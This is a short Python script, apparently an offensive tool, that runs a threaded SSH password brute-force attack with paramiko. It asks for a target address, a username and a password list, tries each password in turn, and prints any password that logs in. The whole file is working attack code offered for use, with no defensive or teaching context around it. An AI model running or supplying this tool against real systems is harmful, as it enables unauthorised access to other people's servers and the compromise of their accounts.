import paramiko
import sys
import os
import socket
import termcolor
import threading
import time
start_time= time.time()
stop_flag = 0
def ssh_connect(password):
    global stop_flag
    ssh= paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22, username=username,password=password)
        stop_flag=1
        print(termcolor.colored(('[+] Found password: ', password, 'for Account ', username), 'green'))

    except:
        print(termcolor.colored(('[+] Incorrect login :', password), 'red'))

    ssh.close()



host=input('[+] Target Address: ')
username= input('[+] SSH Username: ')
input_file = input('Passwords File: ')
print('\n')
if os.path.exists(input_file)==False:
    print('The file does not exist')
    sys.exit(1)
print('Starting threaded SSH Bruteforce attack on',host)
with open(input_file) as file:
    for line in file.readlines():
        if stop_flag==1:
            t.join()
            exit()
        password= line.strip()
        t=threading.Thread(target=ssh_connect,args=(password,))
        t.start()
        time.sleep(0.5)
        end_time=time.time()
        print("Total time of execution: ",end_time-start_time)